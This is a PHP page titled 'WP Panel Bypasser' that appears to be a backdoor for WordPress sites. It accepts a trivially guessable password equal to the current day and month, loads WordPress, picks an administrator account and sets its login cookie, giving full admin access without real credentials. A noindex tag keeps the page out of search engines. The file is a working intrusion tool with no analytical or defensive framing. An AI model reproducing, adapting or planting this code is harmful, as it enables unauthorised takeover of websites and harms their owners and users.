<?php ob_start(); ?>
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name='robots' content='noindex,follow' />
    <title>willygoid - WP Panel Bypasser</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
      .radius-none {
        border-radius: 0;
      }
    </style>
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <?php
    $msg = '';
    if(isset($_POST['login']) && isset($_POST['password'])){
      $today = date('dm');
      if($_POST['password'] === $today){
          require('wp-blog-header.php');
          $user_query = new WP_User_Query( array( 'role' => 'Administrator' ) );
          if ( ! empty( $user_query->results ) ) {
            foreach ( $user_query->results as $user ) {
              $user_login = $user->data->user_login;
            }
          } else {
            echo 'No users found.';
          }

          $user = get_user_by( 'login', $user_login );

        if ( ! empty( $user ) ) {
          $user_id = $user->ID;
          wp_set_current_user($user_id, $user_login);
          wp_set_auth_cookie($user_id);
          do_action('wp_login', $user_login);
          $msg = '<div class="alert-success alert radius-none"><span>Login success....</span><a class="btn btn-success radius-none" href="'.site_url().'/wp-admin">Go to Admin</a></div>';
        }
      }else{
        $msg = '<div class="alert-danger alert radius-none">Password Invalid....</div>';
      }
      
    } 

    ?>
    
    <div class="container">
      <div class="row">
        <div class="col-md-4 col-md-offset-4">
         <?php print $msg; ?>
         <form action="" method="post">
            <div class="panel panel-danger radius-none">
              <div class="panel-heading radius-none">
                  <h3 class="panel-title"><?php print date('D - d-m-Y'); ?></h3>
                </div>
              <div class="panel-body">
                <fieldset>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon radius-none"><i class="glyphicon glyphicon-lock"></i></div>
                            <input name="password" class="form-control radius-none" placeholder="Password" autofocus="" type="password" id="UserPassword">            
                        </div>
                    </div>

                    <div class="form-group form-inline">
                        <input type="submit" value="Login" name="login" class="btn btn-danger radius-none" />
                    </div>
                </fieldset>
              </div>
            </div>
        </form>
        </div>
      </div>
    </div>
    <!-- jQuery -->
    <script src="//code.jquery.com/jquery.js"></script>
    <!-- Bootstrap JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
  </body>
</html>
